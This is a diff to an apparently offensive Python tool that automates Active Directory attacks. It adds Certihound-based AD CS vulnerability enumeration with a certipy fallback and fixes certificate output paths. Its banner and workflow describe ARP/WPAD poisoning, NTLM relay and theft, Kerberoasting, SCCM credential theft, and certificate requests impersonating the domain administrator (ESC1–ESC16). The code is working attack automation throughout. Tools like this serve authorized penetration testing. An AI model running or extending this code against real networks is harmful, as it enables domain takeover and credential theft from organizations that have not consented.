@@ -16,7 +16,7 @@
 ║  8. PXE boot image credential theft via TFTP (zero-auth)        ║
 ║  9. NTLM theft file drops (.library-ms/.theme on shares)        ║
 ║  10. Kerberoasting + AS-REP Roasting (credential harvest)       ║
-║  11. AD CS exploitation — ESC1-ESC16 (certipy)                  ║
+║  11. AD CS — ESC1-17 enum (Certihound) / ESC1-16 exploit        ║
 ║  12. SCCM NAA credential theft (sccmhunter)                     ║
 ║  13. Shadow Credentials (msDS-KeyCredentialLink via PKINIT)     ║
 ║  14. RBCD abuse (S4U2Proxy impersonation)                       ║
@@ -32,6 +32,7 @@ from __future__ import annotations
 
 import argparse
 import ipaddress
+import json
 import logging
 import os
 import re
@@ -51,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.3.0"
+VERSION = "4.3.1"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -796,7 +797,7 @@ def check_prerequisites(cfg: Config) -> bool:
 
     # AD CS tools
     if tool_exists("certipy"):
-        ok("certipy available (AD CS ESC1-ESC16)")
+        ok("certipy available (AD CS ESC1-ESC16 exploitation)")
     else:
         log.warning("certipy not found (optional — apt install certipy-ad)")
 
@@ -2057,39 +2058,51 @@ def _acquire_wsus_cert(wsus_server: str, cfg: Config) -> tuple[str, str] | None:
     cert_dir = cfg.work_dir / "wsus-cert"
     cert_dir.mkdir(exist_ok=True)
 
-    # Step 1: Find vulnerable certificate templates
-    log.info("🔍 Enumerating AD CS templates with certipy...")
-    find_result = run(
-        ["certipy", "find", "-u", f"{cfg.username}@{cfg.domain}",
-         "-p", cfg.password, "-dc-ip", cfg.dc_ip, "-enabled",
-         "-stdout"],
-        cfg, timeout=120
-    )
+    template = ""
+    ca_name = ""
 
-    if find_result.returncode != 0:
-        log.warning("certipy enumeration failed")
-        return None
+    # Step 1a: Try Certihound first (ESC1 implies Enrollee Supplies Subject)
+    ch_result = _certihound_find(cfg)
+    if ch_result:
+        for esc, tmpl in ch_result["vulns"]:
+            if esc == "ESC1" and tmpl and tmpl != "unknown":
+                template = tmpl
+                break
+        ca_name = ch_result["ca_name"]
 
-    # Look for templates with Enrollee Supplies Subject
-    if "Enrollee Supplies Subject" not in find_result.stdout:
-        log.warning("No vulnerable AD CS templates found (need 'Enrollee Supplies Subject')")
-        return None
+    # Step 1b: Fallback to certipy find if Certihound missed it
+    if not template or not ca_name:
+        log.info("🔍 Enumerating AD CS templates with certipy...")
+        find_result = run(
+            ["certipy", "find", "-u", f"{cfg.username}@{cfg.domain}",
+             "-p", cfg.password, "-dc-ip", cfg.dc_ip, "-enabled",
+             "-stdout"],
+            cfg, timeout=120
+        )
 
-    # Extract a usable template name
-    template_match = re.search(
-        r"Template Name\s*:\s*(\S+).*?Enrollee Supplies Subject\s*:\s*True",
-        find_result.stdout, re.DOTALL
-    )
-    if not template_match:
-        log.warning("Could not parse vulnerable template name from certipy output")
-        return None
+        if find_result.returncode != 0:
+            log.warning("certipy enumeration failed")
+            return None
 
-    template = template_match.group(1)
+        if "Enrollee Supplies Subject" not in find_result.stdout:
+            log.warning("No vulnerable AD CS templates found (need 'Enrollee Supplies Subject')")
+            return None
+
+        if not template:
+            template_match = re.search(
+                r"Template Name\s*:\s*(\S+).*?Enrollee Supplies Subject\s*:\s*True",
+                find_result.stdout, re.DOTALL
+            )
+            if not template_match:
+                log.warning("Could not parse vulnerable template name from certipy output")
+                return None
+            template = template_match.group(1)
+
+        if not ca_name:
+            ca_match = re.search(r"CA Name\s*:\s*(.+)", find_result.stdout)
+            ca_name = ca_match.group(1).strip() if ca_match else ""
+
     ok(f"Found vulnerable template: {template}")
-
-    # Extract CA name
-    ca_match = re.search(r"CA Name\s*:\s*(.+)", find_result.stdout)
-    ca_name = ca_match.group(1).strip() if ca_match else ""
     if not ca_name:
         log.warning("Could not determine CA name")
         return None
@@ -3448,13 +3461,114 @@ def run_ntlm_theft(cfg: Config) -> bool:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# AD CS Exploitation (ESC1-ESC16)
+# AD CS Enumeration — Certihound (ESC1-17) with certipy fallback
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _certihound_find(cfg: Config) -> Optional[dict]:
+    """Enumerate ADCS via Certihound. Returns {vulns, ca_name, ca_host} or None on failure.
+
+    vulns: list[tuple[str, str]] of (ESC_type, template_name).
+    NT hash auth unsupported — falls back to certipy when nthash-only auth is used.
+    """
+    if not tool_exists("certihound"):
+        return None
+    if cfg.nthash and not cfg.password:
+        log.info("Certihound does not support NT-hash auth — falling back to certipy")
+        return None
+
+    out_dir = cfg.work_dir / "certihound"
+    out_dir.mkdir(exist_ok=True)
+
+    cmd = ["certihound", "-d", cfg.domain, "-u", cfg.username,
+           "-p", cfg.password, "--dc", cfg.dc_ip,
+           "-o", str(out_dir), "--format", "both"]
+
+    log.info("🔍 Enumerating AD CS with Certihound...")
+    # OpenSSL 3 disables MD4 by default on Debian/Ubuntu — NTLM needs it
+    env_prev = os.environ.get("OPENSSL_CONF")
+    legacy_conf = out_dir / "openssl-legacy.cnf"
+    legacy_conf.write_text(
+        "openssl_conf = openssl_init\n"
+        "[openssl_init]\nproviders = provider_sect\n"
+        "[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n"
+        "[default_sect]\nactivate = 1\n"
+        "[legacy_sect]\nactivate = 1\n"
+    )
+    os.environ["OPENSSL_CONF"] = str(legacy_conf)
+    try:
+        result = run(cmd, cfg, timeout=180)
+    finally:
+        if env_prev is None:
+            os.environ.pop("OPENSSL_CONF", None)
+        else:
+            os.environ["OPENSSL_CONF"] = env_prev
+
+    if result.returncode != 0:
+        log.warning("Certihound enumeration failed — falling back to certipy")
+        return None
+
+    # 1. Parse the structured vulnerabilities report
+    vulns: list[tuple[str, str]] = []
+    ca_name = cfg.ca_name or ""
+    ca_host = ""
+
+    try:
+        for vf in sorted(out_dir.glob("*_vulnerabilities.json")):
+            data = json.loads(vf.read_text())
+            for item in data.get("vulnerabilities", []):
+                esc = str(item.get("type", "")).upper()
+                tmpl = item.get("template") or item.get("ca") or "unknown"
+                if esc.startswith("ESC"):
+                    vulns.append((esc, tmpl))
+                    if not ca_name and item.get("ca"):
+                        ca_name = item["ca"]
+    except Exception as e:
+        log.warning(f"Certihound vulnerabilities parse error: {e}")
+
+    # 2. Parse enterprise CA file for DNS hostname
+    try:
+        for cf in sorted(out_dir.glob("*_enterprisecas.json")):
+            data = json.loads(cf.read_text())
+            for node in data.get("data", []):
+                props = node.get("Properties", {})
+                if not ca_name:
+                    ca_name = props.get("caname", "")
+                if not ca_host:
+                    ca_host = props.get("dnshostname", "")
+                if ca_host:
+                    break
+    except Exception as e:
+        log.warning(f"Certihound CA parse error: {e}")
+
+    # Dedupe while preserving order
+    seen = set()
+    deduped = []
+    for v in vulns:
+        if v not in seen:
+            seen.add(v)
+            deduped.append(v)
+
+    if not deduped:
+        log.warning("Certihound ran but detected no ESC vulnerabilities")
+        return None
+
+    if not ca_host and cfg.dc_ip:
+        ca_host = cfg.dc_ip
+
+    ok(f"Certihound: {len(deduped)} vulnerability/ies detected (CA: {ca_name or '?'})")
+    return {"vulns": deduped, "ca_name": ca_name, "ca_host": ca_host}
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# AD CS Exploitation (ESC1-ESC16 via certipy; ESC5/ESC17 detection-only)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
                            cfg: Config) -> Optional[str]:
     """Exploit a vulnerable AD CS template. Returns PFX path on success, None on failure."""
-    pfx_path = cfg.work_dir / f"adcs-{esc_type}-{template}.pfx"
+    # certipy appends ".pfx" automatically, so pass the stem without extension
+    pfx_stem = cfg.work_dir / f"adcs-{esc_type}-{template}"
+    pfx_path = Path(str(pfx_stem) + ".pfx")
 
     auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
     if cfg.nthash:
@@ -3469,7 +3583,7 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             ["certipy", "req"] + auth_args +
             ["-ca", ca_name, "-template", template,
              "-upn", f"administrator@{cfg.domain}",
-             "-out", str(pfx_path)]
+             "-out", str(pfx_stem)]
         )
         result = run(cmd, cfg, timeout=120)
         if result.returncode == 0 and pfx_path.exists():
@@ -3525,7 +3639,7 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             ["certipy", "req"] + auth_args +
             ["-ca", ca_name, "-template", "SubCA",
              "-upn", f"administrator@{cfg.domain}",
-             "-out", str(pfx_path)]
+             "-out", str(pfx_stem)]
         )
         result = run(req_cmd, cfg, timeout=120)
         # ESC7 may require approval — check for request ID
@@ -3542,7 +3656,7 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             retrieve_cmd = (
                 ["certipy", "req"] + auth_args +
                 ["-ca", ca_name, "-retrieve", req_id,
-                 "-out", str(pfx_path)]
+                 "-out", str(pfx_stem)]
             )
             result = run(retrieve_cmd, cfg, timeout=60)
 
@@ -3557,7 +3671,7 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             ["certipy", "req"] + auth_args +
             ["-ca", ca_name, "-template", template,
              "-upn", f"administrator@{cfg.domain}",
-             "-out", str(pfx_path)]
+             "-out", str(pfx_stem)]
         )
         result = run(cmd, cfg, timeout=120)
         if result.returncode == 0 and pfx_path.exists():
@@ -3686,7 +3800,7 @@ def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
 
 def run_adcs_attack(cfg: Config) -> bool:
     """Exploit AD CS vulnerable certificate templates for domain escalation."""
-    phase_header("AD CS EXPLOITATION (ESC1-ESC16)")
+    phase_header("AD CS EXPLOITATION (ESC1-ESC17 detect / ESC1-ESC16 exploit)")
 
     if not tool_exists("certipy"):
         log.error("certipy not found — install with: apt install certipy-ad")
@@ -3696,74 +3810,79 @@ def run_adcs_attack(cfg: Config) -> bool:
         log.error("AD CS exploitation requires domain credentials (-u/-p)")
         return False
 
-    # 1. Enumerate vulnerable templates
-    log.info("Enumerating AD CS certificate templates with certipy...")
-    enum_output = cfg.work_dir / "adcs-enum.txt"
-
-    auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
-    if cfg.nthash:
-        auth_args += ["-hashes", f":{cfg.nthash}"]
-    else:
-        auth_args += ["-p", cfg.password]
-
-    result = run(
-        ["certipy", "find"] + auth_args +
-        ["-vulnerable", "-stdout", "-json", "-output", str(cfg.work_dir / "adcs-enum")],
-        cfg, timeout=180, outfile=enum_output
-    )
-
-    output = result.stdout or ""
-    if enum_output.exists():
-        output = enum_output.read_text()
-
-    if result.returncode != 0 and not output:
-        log.error("certipy enumeration failed — check credentials and connectivity")
-        return False
-
-    # 2. Parse output for vulnerable templates
-    # Look for ESC markers and extract template/CA info
-    vulnerabilities = []
-    # Priority order for exploitation
+    # Priority order for exploitation (ESC5/ESC17 are detection-only — no exploiter)
     esc_priority = ["ESC1", "ESC8", "ESC4", "ESC6", "ESC7", "ESC13", "ESC15",
-                    "ESC2", "ESC3", "ESC9", "ESC10", "ESC11", "ESC14", "ESC16"]
+                    "ESC2", "ESC3", "ESC9", "ESC10", "ESC11", "ESC14", "ESC16",
+                    "ESC5", "ESC17"]
+    detect_only = {"ESC5", "ESC12", "ESC17"}
 
-    # Extract CA name
-    ca_match = re.search(r"CA Name\s*:\s*(.+)", output)
-    ca_name = cfg.ca_name or (ca_match.group(1).strip() if ca_match else "")
+    # 1a. Try Certihound first (broader coverage + BloodHound CE export)
+    ch_result = _certihound_find(cfg)
+    if ch_result:
+        vulnerabilities = ch_result["vulns"]
+        ca_name = cfg.ca_name or ch_result["ca_name"]
+        ca_host = ch_result["ca_host"]
+    else:
+        # 1b. Fallback to certipy find
+        log.info("Enumerating AD CS certificate templates with certipy...")
+        enum_output = cfg.work_dir / "adcs-enum.txt"
 
-    # Extract CA host for ESC8 — look for DNS Name or CA server hostname
-    ca_host = ""
-    for pattern in [
-        r"DNS Name\s*:\s*(\S+)",
-        r"CA DNS\s*:\s*(\S+)",
-        r"dNSHostName\s*:\s*(\S+)",
-        r"Certificate Authority\s*:.*?DNS Name\s*:\s*(\S+)",
-    ]:
-        m = re.search(pattern, output, re.IGNORECASE | re.DOTALL)
-        if m and m.group(1).lower() not in ("enabled", "disabled", "true", "false"):
-            ca_host = m.group(1).strip()
-            break
-    # Fallback: use DC IP if CA host not found
-    if not ca_host and cfg.dc_ip:
-        ca_host = cfg.dc_ip
+        auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
+        if cfg.nthash:
+            auth_args += ["-hashes", f":{cfg.nthash}"]
+        else:
+            auth_args += ["-p", cfg.password]
 
-    # Find all ESC vulnerabilities with their templates
-    # certipy outputs sections per template with ESC markers
-    template_sections = re.split(r"(?=Template Name\s*:)", output)
-    for section in template_sections:
-        tmpl_match = re.search(r"Template Name\s*:\s*(\S+)", section)
-        if not tmpl_match:
-            continue
-        template = tmpl_match.group(1)
+        result = run(
+            ["certipy", "find"] + auth_args +
+            ["-vulnerable", "-stdout", "-json", "-output", str(cfg.work_dir / "adcs-enum")],
+            cfg, timeout=180, outfile=enum_output
+        )
 
-        for esc in esc_priority:
-            if re.search(rf"\b{esc}\b", section):
-                vulnerabilities.append((esc, template))
+        output = result.stdout or ""
+        if enum_output.exists():
+            output = enum_output.read_text()
 
-    # Check for ESC8 (HTTP enrollment) separately
-    if re.search(r"Web Enrollment|HTTP.*Enrollment|ESC8", output, re.IGNORECASE):
-        if ("ESC8", "WebEnrollment") not in vulnerabilities:
-            vulnerabilities.append(("ESC8", "WebEnrollment"))
+        if result.returncode != 0 and not output:
+            log.error("certipy enumeration failed — check credentials and connectivity")
+            return False
+
+        vulnerabilities = []
+
+        # Extract CA name
+        ca_match = re.search(r"CA Name\s*:\s*(.+)", output)
+        ca_name = cfg.ca_name or (ca_match.group(1).strip() if ca_match else "")
+
+        # Extract CA host for ESC8 — look for DNS Name or CA server hostname
+        ca_host = ""
+        for pattern in [
+            r"DNS Name\s*:\s*(\S+)",
+            r"CA DNS\s*:\s*(\S+)",
+            r"dNSHostName\s*:\s*(\S+)",
+            r"Certificate Authority\s*:.*?DNS Name\s*:\s*(\S+)",
+        ]:
+            m = re.search(pattern, output, re.IGNORECASE | re.DOTALL)
+            if m and m.group(1).lower() not in ("enabled", "disabled", "true", "false"):
+                ca_host = m.group(1).strip()
+                break
+        if not ca_host and cfg.dc_ip:
+            ca_host = cfg.dc_ip
+
+        # Find all ESC vulnerabilities with their templates
+        template_sections = re.split(r"(?=Template Name\s*:)", output)
+        for section in template_sections:
+            tmpl_match = re.search(r"Template Name\s*:\s*(\S+)", section)
+            if not tmpl_match:
+                continue
+            template = tmpl_match.group(1)
+            for esc in esc_priority:
+                if re.search(rf"\b{esc}\b", section):
+                    vulnerabilities.append((esc, template))
+
+        # Check for ESC8 (HTTP enrollment) separately
+        if re.search(r"Web Enrollment|HTTP.*Enrollment|ESC8", output, re.IGNORECASE):
+            if ("ESC8", "WebEnrollment") not in vulnerabilities:
+                vulnerabilities.append(("ESC8", "WebEnrollment"))
 
     if not vulnerabilities:
         log.warning("No vulnerable AD CS templates found")
@@ -3784,6 +3903,10 @@ def run_adcs_attack(cfg: Config) -> bool:
 
     for esc_type, template in vuln_sorted:
         separator()
+
+        if esc_type in detect_only:
+            log.warning(f"  {esc_type} detected on '{template}' — no automated exploiter (manual required)")
+            continue
 
         # ESC8 uses relay, not direct exploitation
         if esc_type == "ESC8" and ca_host:
@@ -4932,7 +5055,7 @@ def run_full_auto(cfg: Config):
     detail("1-3  ARP spoof → WPAD poisoning → WSUS relay → PXE theft")
     detail("4️⃣   NTLM theft file drops (.library-ms/.theme on shares)")
     detail("5️⃣   Kerberoast + AS-REP Roast (credential harvest)")
-    detail("6️⃣   AD CS exploitation — ESC1-ESC16 (certipy)")
+    detail("6️⃣   AD CS — ESC1-17 detection (Certihound) / ESC1-16 exploit (certipy)")
     detail("7️⃣   SCCM NAA credential theft (sccmhunter)")
     detail("8️⃣   Enumerate targets + exploit (Shadow Creds / RBCD)")
     detail("9️⃣   WSUS update injection (AppLocker bypass)")
@@ -5037,7 +5160,7 @@ def run_full_auto(cfg: Config):
         log.info("Running Kerberoast + AS-REP Roast for additional credentials...")
         run_roast_attack(cfg)
 
-    # Step 6: AD CS exploitation (ESC1-ESC16)
+    # Step 6: AD CS enum + exploitation (ESC1-ESC17 detect / ESC1-ESC16 exploit)
     if not cfg.no_adcs and tool_exists("certipy"):
         log.info("Enumerating AD CS for vulnerable certificate templates...")
         if run_adcs_attack(cfg):
